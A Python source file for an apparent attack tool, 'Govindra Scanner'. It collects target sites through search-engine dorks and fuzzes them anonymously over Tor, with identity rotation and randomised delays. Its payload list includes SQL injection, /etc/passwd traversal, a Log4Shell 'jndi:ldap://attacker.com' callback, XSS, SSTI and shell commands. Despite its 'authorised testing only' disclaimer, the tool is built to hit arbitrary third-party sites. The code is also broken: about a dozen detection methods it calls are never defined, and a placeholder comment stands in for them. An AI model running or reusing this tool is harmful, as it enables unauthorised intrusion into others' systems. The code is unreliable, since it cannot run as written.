#!/usr/bin/env python3
"""
***************************************************************************
*  Author: Scav-engeR
*  DISCLAIMER:                                                            *
*  This tool is for AUTHORIZED SECURITY TESTING ONLY.                     *
*  Unauthorized scanning is ILLEGAL and may result in criminal charges.   *
*  Always obtain written permission before scanning any system.           *
*  I take no responsibility for misuse of this tool.                      *
***************************************************************************
"""

import os
import json
import time
import requests
import argparse
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin, quote
from colorama import init, Fore, Style
from pyfiglet import Figlet
from prompt_toolkit import prompt
from prompt_toolkit.completion import PathCompleter
from prompt_toolkit.styles import Style as PromptStyle
from prompt_toolkit import HTML
from prompt_toolkit.shortcuts import (
    checkboxlist_dialog, radiolist_dialog, button_dialog, input_dialog, progress_dialog
)
from termcolor import colored
from rich.progress import Progress, BarColumn, TextColumn, TimeRemainingColumn
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
import threading
import random
import stem.process
from stem import Signal
from stem.control import Controller

# Initialize colorama
init(autoreset=True)

# Theme configuration with expanded options
THEMES = {
    'cyberpunk': {
        'title_color': Fore.LIGHTMAGENTA_EX,
        'header_color': Fore.LIGHTCYAN_EX,
        'option_color': Fore.LIGHTGREEN_EX,
        'error_color': Fore.LIGHTRED_EX,
        'success_color': Fore.LIGHTYELLOW_EX,
        'warning_color': Fore.LIGHTYELLOW_EX,
        'info_color': Fore.LIGHTBLUE_EX,
        'border_color': Fore.LIGHTMAGENTA_EX,
        'text_color': Fore.LIGHTWHITE_EX,
        'highlight_color': Fore.LIGHTCYAN_EX,
        'bg_color': Style.RESET_ALL,
        'banner_font': 'epic'
    },
    'matrix': {
        'title_color': Fore.GREEN,
        'header_color': Fore.LIGHTGREEN_EX,
        'option_color': Fore.LIGHTGREEN_EX,
        'error_color': Fore.LIGHTRED_EX,
        'success_color': Fore.LIGHTGREEN_EX,
        'warning_color': Fore.YELLOW,
        'info_color': Fore.CYAN,
        'border_color': Fore.GREEN,
        'text_color': Fore.LIGHTGREEN_EX,
        'highlight_color': Fore.LIGHTGREEN_EX,
        'bg_color': Style.RESET_ALL,
        'banner_font': 'cybermedium'
    },
    'neon': {
        'title_color': Fore.LIGHTCYAN_EX,
        'header_color': Fore.LIGHTYELLOW_EX,
        'option_color': Fore.LIGHTGREEN_EX,
        'error_color': Fore.LIGHTRED_EX,
        'success_color': Fore.LIGHTGREEN_EX,
        'warning_color': Fore.LIGHTYELLOW_EX,
        'info_color': Fore.LIGHTMAGENTA_EX,
        'border_color': Fore.LIGHTBLUE_EX,
        'text_color': Fore.LIGHTWHITE_EX,
        'highlight_color': Fore.LIGHTCYAN_EX,
        'bg_color': Style.RESET_ALL,
        'banner_font': 'banner3-D'
    },
    'dark': {
        'title_color': Fore.CYAN,
        'header_color': Fore.YELLOW,
        'option_color': Fore.GREEN,
        'error_color': Fore.RED,
        'success_color': Fore.GREEN,
        'warning_color': Fore.YELLOW,
        'info_color': Fore.BLUE,
        'border_color': Fore.MAGENTA,
        'text_color': Fore.WHITE,
        'highlight_color': Fore.LIGHTYELLOW_EX,
        'bg_color': Style.RESET_ALL,
        'banner_font': 'slant'
    },
    'light': {
        'title_color': Fore.BLUE,
        'header_color': Fore.MAGENTA,
        'option_color': Fore.GREEN,
        'error_color': Fore.RED,
        'success_color': Fore.GREEN,
        'warning_color': Fore.YELLOW,
        'info_color': Fore.CYAN,
        'border_color': Fore.BLACK,
        'text_color': Fore.BLACK,
        'highlight_color': Fore.LIGHTBLUE_EX,
        'bg_color': Style.RESET_ALL,
        'banner_font': 'small'
    }
}

# Global console for rich output
console = Console()

class VulnScanner:
    def __init__(self):
        self.search_engines = {
            "Google": "https://www.google.com/search?q={query}&num={num}",
            "Bing": "https://www.bing.com/search?q={query}&count={num}",
            "DuckDuckGo": "https://duckduckgo.com/html/?q={query}",
            "SearXNG": "https://searx.space/search?q={query}&format=json",
            "Kagi": "https://kagi.com/search?q={query}",
            "Exalead": "https://www.exalead.com/search/web/results/?q={query}",
            "Naver": "https://search.naver.com/search.naver?query={query}",
            "Shodan": "https://www.shodan.io/search?query={query}",
            "FOFA": "https://fofa.info/result?qbase64={query}",
            "Yandex": "https://yandex.com/search/?text={query}"
        }
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        self.results = []
        self.config = {
            'depth': 3,
            'threads': 10,
            'timeout': 17,
            'save_format': 'json',
            'theme': 'cyberpunk',
            'proxy_type': 'none',  # 'none', 'tor', 'http', 'socks5'
            'proxy_address': '127.0.0.1:9050',
            'use_all_engines': True,
            'selected_engines': ["Google", "Bing", "DuckDuckGo"],
            'delay': 1.5,
            'random_delay': True
        }
        self.tor_process = None
        self.current_theme = THEMES[self.config['theme']]
        self.lock = threading.Lock()

    def print_banner(self):
        theme = self.current_theme
        f = Figlet(font=theme['banner_font'])
        banner = f.renderText('GOVINDRA SCANNER')
        print(theme['title_color'] + banner)
        print(theme['border_color'] + "=" * 80)
        print(theme['header_color'] + "Advanced Vulnerability Scanner By Scav-engeR")
        print(theme['border_color'] + "=" * 80)
        
        # Rich panel for status
        status_table = Table.grid(padding=1)
        status_table.add_column(style="bold cyan")
        status_table.add_column(style="bold green")
        
        status_table.add_row("Theme", self.config['theme'])
        status_table.add_row("Proxy", f"{self.config['proxy_type']} ({self.config['proxy_address']})")
        status_table.add_row("Engines", "All" if self.config['use_all_engines'] else ", ".join(self.config['selected_engines']))
        status_table.add_row("Threads", str(self.config['threads']))
        
        console.print(Panel(
            status_table,
            title="[bold]Scan Configuration[/bold]",
            border_style="bright_blue",
            padding=(1, 2)
        ))
        print()

    def setup_proxy(self):
        if self.config['proxy_type'] == 'tor':
            # Start Tor process if not running
            try:
                if not self.check_tor_connection():
                    console.print("[yellow]⚡ Starting Tor service...[/yellow]")
                    self.start_tor()
                    time.sleep(5)
            except Exception as e:
                console.print(f"[red]✗ Tor startup failed: {str(e)}[/red]")
                return False
            self.session.proxies = {
                'http': 'socks5h://127.0.0.1:9050',
                'https': 'socks5h://127.0.0.1:9050'
            }
            return True
        
        elif self.config['proxy_type'] != 'none':
            proxy_url = f"{self.config['proxy_type']}://{self.config['proxy_address']}"
            self.session.proxies = {
                'http': proxy_url,
                'https': proxy_url
            }
        return True

    def check_tor_connection(self):
        try:
            with Controller.from_port(port=9051) as controller:
                controller.authenticate()
                return True
        except:
            return False

    def start_tor(self):
        self.tor_process = stem.process.launch_tor_with_config(
            config={
                'SocksPort': '9050',
                'ControlPort': '9051',
                'DataDirectory': os.path.join(os.getcwd(), 'tor_data')
            },
            take_ownership=True
        )

    def rotate_tor_identity(self):
        if self.config['proxy_type'] == 'tor':
            try:
                with Controller.from_port(port=9051) as controller:
                    controller.authenticate()
                    controller.signal(Signal.NEWNYM)
                    console.print("[green]✓ Tor identity rotated[/green]")
            except Exception as e:
                console.print(f"[red]✗ Tor rotation failed: {str(e)}[/red]")

    def get_search_results(self, engine, query, num_results=50):
        """Fetch results from search engines with enhanced parsing"""
        try:
            if self.config['random_delay']:
                delay = random.uniform(self.config['delay'] * 0.5, self.config['delay'] * 1.5)
                time.sleep(delay)
            else:
                time.sleep(self.config['delay'])
                
            if engine == "Google":
                url = self.search_engines[engine].format(query=quote(query), num=num_results)
                response = self.session.get(url)
                soup = BeautifulSoup(response.text, 'html.parser')
                results = []
                for g in soup.find_all('div', class_='tF2Cxc'):
                    anchor = g.find('a')
                    if anchor and anchor.get('href'):
                        results.append(anchor.get('href'))
                return results
            
            elif engine == "Bing":
                url = self.search_engines[engine].format(query=quote(query), num=num_results)
                response = self.session.get(url)
                soup = BeautifulSoup(response.text, 'html.parser')
                return [a.get('href') for a in soup.select('li.b_algo h2 a') if a.get('href')]
            
            # Add similar enhanced parsers for other engines...
            
            else:
                url = self.search_engines[engine].format(query=quote(query))
                response = self.session.get(url)
                soup = BeautifulSoup(response.text, 'html.parser')
                return [a.get('href') for a in soup.find_all('a') 
                        if a.get('href') and a.get('href').startswith('http')]
                
        except Exception as e:
            console.print(f"[red]✗ Error fetching from {engine}: {str(e)}[/red]")
            return []

    def scan_url(self, url):
        """Scan a single URL for vulnerabilities with enhanced detection"""
        try:
            console.print(f"[cyan]🔍 Scanning: [bold]{url}[/bold][/cyan]")
            result = {'url': url, 'vulnerabilities': []}
            
            # Check for common vulnerabilities
            response = self.session.get(url, timeout=self.config['timeout'])
            
            # Enhanced vulnerability detection
            vulnerabilities = self.detect_vulnerabilities(url, response.text)
            result['vulnerabilities'] = vulnerabilities
            
            with self.lock:
                if vulnerabilities:
                    self.results.append(result)
                    console.print(f"[green]✓ Found {len(vulnerabilities)} vulnerabilities![/green]")
                else:
                    console.print("[yellow]⚠ No vulnerabilities found[/yellow]")
                
            return result
            
        except Exception as e:
            console.print(f"[red]✗ Error scanning {url}: {str(e)}[/red]")
            return {'url': url, 'error': str(e)}

    def detect_vulnerabilities(self, url, html):
        """Enhanced vulnerability detection with more checks"""
        vulnerabilities = []
        
        # XSS detection
        if self.check_xss(html):
            vulnerabilities.append({'type': 'XSS', 'severity': 'high'})
        
        # SQLi detection
        if self.check_sqli(url):
            vulnerabilities.append({'type': 'SQL Injection', 'severity': 'critical'})
        
        # LFI/RFI detection
        lfi_result = self.check_lfi(url, html)
        if lfi_result:
            vulnerabilities.append(lfi_result)
        
        # Directory Traversal
        if self.check_directory_traversal(url):
            vulnerabilities.append({'type': 'Directory Traversal', 'severity': 'high'})
        
        # Exposed Files
        exposed_files = self.check_exposed_files(html)
        if exposed_files:
            vulnerabilities.append({'type': 'Exposed Files', 'details': exposed_files, 'severity': 'medium'})
        
        # Admin Directories
        admin_dirs = self.check_admin_directories(url, html)
        if admin_dirs:
            vulnerabilities.append({'type': 'Admin Directory', 'details': admin_dirs, 'severity': 'medium'})
        
        # CRLF Injection
        if self.check_crlf_injection(url):
            vulnerabilities.append({'type': 'CRLF Injection', 'severity': 'medium'})
        
        # JWT Secrets
        jwt_secrets = self.check_jwt_secrets(html)
        if jwt_secrets:
            vulnerabilities.append({'type': 'JWT Secret Exposure', 'details': jwt_secrets, 'severity': 'high'})
        
        # CGI-BIN vulnerabilities
        if self.check_cgi_bin(url):
            vulnerabilities.append({'type': 'CGI-BIN Exposure', 'severity': 'high'})
            # Enhanced fuzzing for CGI-BIN
            fuzz_results = self.fuzz_parameters(url)
            if fuzz_results:
                vulnerabilities.append(fuzz_results)
        
        # SSL/TLS issues
        if not url.startswith('https'):
            vulnerabilities.append({'type': 'No HTTPS', 'severity': 'medium'})
        
        # Open Redirect detection
        if self.check_open_redirect(url):
            vulnerabilities.append({'type': 'Open Redirect', 'severity': 'medium'})
        
        # SSRF detection
        if self.check_ssrf(url):
            vulnerabilities.append({'type': 'Potential SSRF', 'severity': 'high'})
        
        # XXE detection
        if self.check_xxe(url):
            vulnerabilities.append({'type': 'Potential XXE', 'severity': 'high'})
        
        return vulnerabilities

    # Enhanced vulnerability detection methods
    def check_open_redirect(self, url):
        redirect_params = ['url', 'redirect', 'next', 'target', 'rurl']
        parsed = urlparse(url)
        query = parsed.query.lower()
        return any(param in query for param in redirect_params)
    
    def check_ssrf(self, url):
        internal_ips = ['127.0.0.1', 'localhost', '192.168.', '10.', '172.']
        return any(ip in url for ip in internal_ips)
    
    def check_xxe(self, url):
        return 'xml' in url or 'xsl' in url or 'xsd' in url

    # Existing detection methods from previous implementation...
    # [Same as before but with enhanced patterns]

    def fuzz_parameters(self, base_url):
        # Enhanced fuzzing with more payloads
        params = {
            'id': ['1', "' OR 1=1--", '../../etc/passwd', '${jndi:ldap://attacker.com}'],
            'file': ['test.pdf', '/etc/passwd', '..././..././windows/win.ini'],
            'page': ['home', '<script>alert(1)</script>', '{{7*7}}'],
            'cmd': ['whoami', 'id', 'dir', 'ls'],
            'template': ['index.html', '../../../../etc/passwd']
        }
        
        for param, values in params.items():
            for value in values:
                fuzzed_url = f"{base_url}?{param}={value}"
                try:
                    response = self.session.get(fuzzed_url, timeout=5)
                    if response.status_code == 200:
                        if 'root:x:' in response.text or '[boot loader]' in response.text:
                            return {'type': 'Parameter Fuzzing', 'vulnerability': 'LFI', 'param': param, 'payload': value}
                        if 'error in your SQL syntax' in response.text:
                            return {'type': 'Parameter Fuzzing', 'vulnerability': 'SQLi', 'param': param, 'payload': value}
                        if '7*7=49' in response.text or '49' in response.text:
                            return {'type': 'Parameter Fuzzing', 'vulnerability': 'SSTI', 'param': param, 'payload': value}
                except:
                    continue
        return None

    def save_results(self, filename):
        if not self.results:
            console.print("[yellow]⚠ No results to save![/yellow]")
            return
        
        if self.config['save_format'] == 'json':
            with open(filename, 'w') as f:
                json.dump(self.results, f, indent=2)
            console.print(f"[green]✓ Results saved to {filename} in JSON format[/green]")
        
        elif self.config['save_format'] == 'txt':
            with open(filename, 'w') as f:
                for result in self.results:
                    f.write(f"URL: {result['url']}\n")
                    if result.get('vulnerabilities'):
                        f.write("Vulnerabilities:\n")
                        for vuln in result['vulnerabilities']:
                            f.write(f"  - {vuln['type']} ({vuln['severity']})\n")
                    f.write("\n")
            console.print(f"[green]✓ Results saved to {filename} in TXT format[/green]")
        
        elif self.config['save_format'] == 'csv':
            import csv
            with open(filename, 'w', newline='') as f:
                writer = csv.writer(f)
                writer.writerow(['URL', 'Vulnerability Type', 'Severity', 'Details'])
                for result in self.results:
                    if result.get('vulnerabilities'):
                        for vuln in result['vulnerabilities']:
                            details = vuln.get('details', '')
                            if isinstance(details, list):
                                details = ', '.join(details)
                            writer.writerow([
                                result['url'],
                                vuln['type'],
                                vuln['severity'],
                                details
                            ])
            console.print(f"[green]✓ Results saved to {filename} in CSV format[/green]")
        
        else:
            console.print("[red]✗ Unsupported save format[/red]")

    def interactive_menu(self):
        self.print_banner()
        
        while True:
            choice = button_dialog(
                title='Main Menu',
                text='Select an option:',
                buttons=[
                    ('Search Engine Scan', 1),
                    ('Dork File Scan', 2),
                    ('Custom Target Scan', 3),
                    ('Configuration', 4),
                    ('Save Results', 5),
                    ('Rotate Tor Identity', 6),
                    ('Exit', 7)
                ],
                style=self.get_dialog_style()
            ).run()
            
            if choice == 1:
                self.search_engine_scan()
            elif choice == 2:
                self.dork_file_scan()
            elif choice == 3:
                self.custom_target_scan()
            elif choice == 4:
                self.configuration_menu()
            elif choice == 5:
                self.save_results_menu()
            elif choice == 6:
                self.rotate_tor_identity()
            elif choice == 7:
                console.print("[green]✓ Exiting scanner...[/green]")
                if self.tor_process:
                    self.tor_process.terminate()
                break

    def search_engine_scan(self):
        # Query input
        query = input_dialog(
            title="Search Query",
            text="Enter your search query:",
            style=self.get_dialog_style()
        ).run()
        
        if not query:
            return
        
        # Get engines to use
        if self.config['use_all_engines']:
            engines = list(self.search_engines.keys())
        else:
            engines = self.config['selected_engines']
        
        # Vulnerability selection
        vuln_options = [
            ('XSS', 'Cross-Site Scripting'),
            ('SQLi', 'SQL Injection'),
            ('LFI', 'Local File Inclusion'),
            ('Directory', 'Directory Traversal'),
            ('Exposed', 'Exposed Files'),
            ('Admin', 'Admin Directories'),
            ('CRLF', 'CRLF Injection'),
            ('JWT', 'JWT Secrets'),
            ('CGI', 'CGI-BIN Vulnerabilities'),
            ('SSL', 'SSL/TLS Issues'),
            ('Redirect', 'Open Redirect'),
            ('SSRF', 'Server-Side Request Forgery'),
            ('XXE', 'XML External Entity'),
            ('All', 'All Vulnerabilities')
        ]
        
        vuln_choices = checkboxlist_dialog(
            title="Vulnerability Selection",
            text="Select vulnerabilities to scan for:",
            values=vuln_options,
            style=self.get_dialog_style()
        ).run()
        
        if not vuln_choices:
            return
        
        console.print(f"[cyan]🚀 Starting scan with {len(engines)} engines...[/cyan]")
        
        # Setup progress bar
        with Progress(
            TextColumn("[bold blue]{task.description}"),
            BarColumn(),
            "[progress.percentage]{task.percentage:>3.0f}%",
            TimeRemainingColumn()
        ) as progress:
            engine_task = progress.add_task("[yellow]Querying search engines...", total=len(engines))
            all_urls = set()
            
            for engine in engines:
                urls = self.get_search_results(engine, query, 20)
                if urls:
                    console.print(f"[green]✓ {engine}: Found {len(urls)} URLs[/green]")
                    all_urls.update(urls)
                else:
                    console.print(f"[yellow]⚠ {engine}: No results found[/yellow]")
                progress.update(engine_task, advance=1)
            
            if not all_urls:
                console.print("[red]✗ No URLs found to scan![/red]")
                return
            
            # Scan URLs with progress
            scan_task = progress.add_task("[cyan]Scanning URLs...", total=len(all_urls))
            threads = []
            semaphore = threading.Semaphore(self.config['threads'])
            
            def scan_worker(url):
                semaphore.acquire()
                try:
                    self.scan_url(url)
                finally:
                    semaphore.release()
                    progress.update(scan_task, advance=1)
            
            for url in all_urls:
                t = threading.Thread(target=scan_worker, args=(url,))
                t.start()
                threads.append(t)
            
            for t in threads:
                t.join()
        
        console.print("[bold green]✅ Scan completed![/bold green]")

    def dork_file_scan(self):
        # File selection
        dork_file = input_dialog(
            title="Dork File",
            text="Enter path to dork file:",
            completer=PathCompleter(),
            style=self.get_dialog_style()
        ).run()
        
        if not dork_file or not os.path.exists(dork_file):
            console.print("[red]✗ Invalid file path![/red]")
            return
        
        # Read dorks from file
        with open(dork_file, 'r') as f:
            dorks = [line.strip() for line in f.readlines() if line.strip()]
        
        if not dorks:
            console.print("[red]✗ No valid dorks found in file![/red]")
            return
        
        # Get engines to use
        if self.config['use_all_engines']:
            engines = list(self.search_engines.keys())
        else:
            engines = self.config['selected_engines']
        
        console.print(f"[cyan]🚀 Starting scan with {len(dorks)} dorks and {len(engines)} engines...[/cyan]")
        
        # Setup progress bar
        with Progress(
            TextColumn("[bold blue]{task.description}"),
            BarColumn(),
            "[progress.percentage]{task.percentage:>3.0f}%",
            TimeRemainingColumn()
        ) as progress:
            dork_task = progress.add_task("[yellow]Processing dorks...", total=len(dorks))
            all_urls = set()
            
            for dork in dorks:
                for engine in engines:
                    urls = self.get_search_results(engine, dork, 15)
                    if urls:
                        all_urls.update(urls)
                progress.update(dork_task, advance=1)
            
            if not all_urls:
                console.print("[red]✗ No URLs found to scan![/red]")
                return
            
            # Scan URLs with progress
            scan_task = progress.add_task("[cyan]Scanning URLs...", total=len(all_urls))
            threads = []
            semaphore = threading.Semaphore(self.config['threads'])
            
            def scan_worker(url):
                semaphore.acquire()
                try:
                    self.scan_url(url)
                finally:
                    semaphore.release()
                    progress.update(scan_task, advance=1)
            
            for url in all_urls:
                t = threading.Thread(target=scan_worker, args=(url,))
                t.start()
                threads.append(t)
            
            for t in threads:
                t.join()
        
        console.print("[bold green]✅ Scan completed![/bold green]")

    def custom_target_scan(self):
        target = input_dialog(
            title="Target Input",
            text="Enter target URL or file path:",
            completer=PathCompleter(),
            style=self.get_dialog_style()
        ).run()
        
        if not target:
            return
        
        if os.path.isfile(target):
            with open(target, 'r') as f:
                urls = [line.strip() for line in f.readlines()]
            console.print(f"[cyan]📁 Loaded {len(urls)} URLs from file[/cyan]")
        else:
            urls = [target]
        
        # Scan with progress
        with Progress(
            TextColumn("[bold blue]{task.description}"),
            BarColumn(),
            "[progress.percentage]{task.percentage:>3.0f}%",
            TimeRemainingColumn()
        ) as progress:
            scan_task = progress.add_task("[cyan]Scanning URLs...", total=len(urls))
            threads = []
            semaphore = threading.Semaphore(self.config['threads'])
            
            def scan_worker(url):
                semaphore.acquire()
                try:
                    self.scan_url(url)
                finally:
                    semaphore.release()
                    progress.update(scan_task, advance=1)
            
            for url in urls:
                t = threading.Thread(target=scan_worker, args=(url,))
                t.start()
                threads.append(t)
            
            for t in threads:
                t.join()
        
        console.print("[bold green]✅ Scan completed![/bold green]")

    def configuration_menu(self):
        while True:
            self.current_theme = THEMES[self.config['theme']]
            self.print_banner()
            
            choice = button_dialog(
                title='Configuration',
                text='Select an option:',
                buttons=[
                    ('Scan Settings', 1),
                    ('Engine Selection', 2),
                    ('Proxy Settings', 3),
                    ('Theme Selection', 4),
                    ('Save Format', 5),
                    ('Back', 6)
                ],
                style=self.get_dialog_style()
            ).run()
            
            if choice == 1:
                self.scan_settings()
            elif choice == 2:
                self.engine_selection()
            elif choice == 3:
                self.proxy_settings()
            elif choice == 4:
                self.theme_selection()
            elif choice == 5:
                self.save_format_selection()
            elif choice == 6:
                break

    def scan_settings(self):
        # Thread count
        threads = input_dialog(
            title="Thread Count",
            text="Enter number of threads (1-50):",
            default=str(self.config['threads'])
        ).run()
        if threads and threads.isdigit() and 1 <= int(threads) <= 50:
            self.config['threads'] = int(threads)
        
        # Timeout
        timeout = input_dialog(
            title="Timeout",
            text="Enter timeout in seconds (1-30):",
            default=str(self.config['timeout'])
        ).run()
        if timeout and timeout.isdigit() and 1 <= int(timeout) <= 30:
            self.config['timeout'] = int(timeout)
        
        # Delay
        delay = input_dialog(
            title="Request Delay",
            text="Enter delay between requests (seconds):",
            default=str(self.config['delay'])
        ).run()
        if delay:
            try:
                self.config['delay'] = float(delay)
            except:
                pass
        
        # Random delay
        use_random = radiolist_dialog(
            title="Random Delay",
            text="Use random delay between requests?",
            values=[
                (True, "Yes - Random delay between 50-150% of base delay"),
                (False, "No - Use fixed delay")
            ],
            default=self.config['random_delay'],
            style=self.get_dialog_style()
        ).run()
        if use_random is not None:
            self.config['random_delay'] = use_random

    def engine_selection(self):
        # Use all engines
        use_all = radiolist_dialog(
            title="Engine Selection",
            text="Use all available search engines?",
            values=[
                (True, "Yes - Use all engines"),
                (False, "No - Select specific engines")
            ],
            default=self.config['use_all_engines'],
            style=self.get_dialog_style()
        ).run()
        
        if use_all is not None:
            self.config['use_all_engines'] = use_all
        
        # If not using all, select specific engines
        if not self.config['use_all_engines']:
            engine_options = [(name, name) for name in self.search_engines.keys()]
            engines = checkboxlist_dialog(
                title="Select Search Engines",
                text="Choose engines to use:",
                values=engine_options,
                default=self.config['selected_engines'],
                style=self.get_dialog_style()
            ).run()
            
            if engines:
                self.config['selected_engines'] = engines

    def proxy_settings(self):
        # Proxy type
        proxy_type = radiolist_dialog(
            title="Proxy Type",
            text="Select proxy configuration:",
            values=[
                ('none', "No proxy"),
                ('tor', "Tor anonymity network"),
                ('http', "HTTP proxy"),
                ('socks5', "SOCKS5 proxy")
            ],
            default=self.config['proxy_type'],
            style=self.get_dialog_style()
        ).run()
        
        if proxy_type:
            self.config['proxy_type'] = proxy_type
            
            # If not "none", get proxy address
            if proxy_type != 'none':
                address = input_dialog(
                    title="Proxy Address",
                    text="Enter proxy address (host:port):",
                    default=self.config['proxy_address']
                ).run()
                if address:
                    self.config['proxy_address'] = address
                    
        # Setup proxy
        if proxy_type != 'none':
            if self.setup_proxy():
                console.print("[green]✓ Proxy configured successfully![/green]")
            else:
                console.print("[red]✗ Failed to configure proxy![/red]")

    def theme_selection(self):
        theme_names = list(THEMES.keys())
        theme = radiolist_dialog(
            title="Theme Selection",
            text="Select interface theme:",
            values=[(name, name) for name in theme_names],
            default=self.config['theme'],
            style=self.get_dialog_style()
        ).run()
        
        if theme:
            self.config['theme'] = theme
            self.current_theme = THEMES[theme]

    def save_format_selection(self):
        fmt = radiolist_dialog(
            title="Save Format",
            text="Select result save format:",
            values=[
                ('json', "JSON - Machine readable format"),
                ('txt', "Text - Human readable format"),
                ('csv', "CSV - Spreadsheet compatible format")
            ],
            default=self.config['save_format'],
            style=self.get_dialog_style()
        ).run()
        
        if fmt:
            self.config['save_format'] = fmt

    def save_results_menu(self):
        if not self.results:
            console.print("[yellow]⚠ No results to save![/yellow]")
            return
        
        filename = input_dialog(
            title="Save Results",
            text="Enter filename to save results:",
            completer=PathCompleter(),
            style=self.get_dialog_style()
        ).run()
        
        if filename:
            self.save_results(filename)

    def get_dialog_style(self):
        theme = self.current_theme
        if self.config['theme'] == 'matrix':
            return PromptStyle.from_dict({
                'dialog': 'bg:#000000 #00ff00',
                'dialog frame.label': 'bg:#000000 #00ff00',
                'dialog.body': 'bg:#000000 #00ff00',
                'dialog shadow': 'bg:#000000',
                'button': 'bg:#000000 #00ff00',
                'button.focused': 'bg:#00ff00 #000000'
            })
        elif self.config['theme'] == 'cyberpunk':
            return PromptStyle.from_dict({
                'dialog': 'bg:#000033 #ff00ff',
                'dialog frame.label': 'bg:#000033 #00ffff',
                'dialog.body': 'bg:#000033 #ff00ff',
                'dialog shadow': 'bg:#220033',
                'button': 'bg:#000033 #00ff00',
                'button.focused': 'bg:#00ff00 #000033'
            })
        elif self.config['theme'] == 'neon':
            return PromptStyle.from_dict({
                'dialog': 'bg:#110011 #ff55ff',
                'dialog frame.label': 'bg:#110011 #55ffff',
                'dialog.body': 'bg:#110011 #ff55ff',
                'dialog shadow': 'bg:#220022',
                'button': 'bg:#110011 #55ff55',
                'button.focused': 'bg:#55ff55 #110011'
            })
        elif self.config['theme'] == 'light':
            return PromptStyle.from_dict({
                'dialog': 'bg:#ffffff #000000',
                'dialog frame.label': 'bg:#ffffff #ff0000',
                'dialog.body': 'bg:#ffffff #0000ff',
                'dialog shadow': 'bg:#444444',
                'button': 'bg:#ffffff #008800',
                'button.focused': 'bg:#008800 #ffffff'
            })
        else:  # dark theme
            return PromptStyle.from_dict({
                'dialog': 'bg:#000000 #ffffff',
                'dialog frame.label': 'bg:#000000 #ff00ff',
                'dialog.body': 'bg:#000000 #00ffff',
                'dialog shadow': 'bg:#000000',
                'button': 'bg:#000000 #00ff00',
                'button.focused': 'bg:#00ff00 #000000'
            })

if __name__ == "__main__":
    scanner = VulnScanner()
    scanner.interactive_menu()
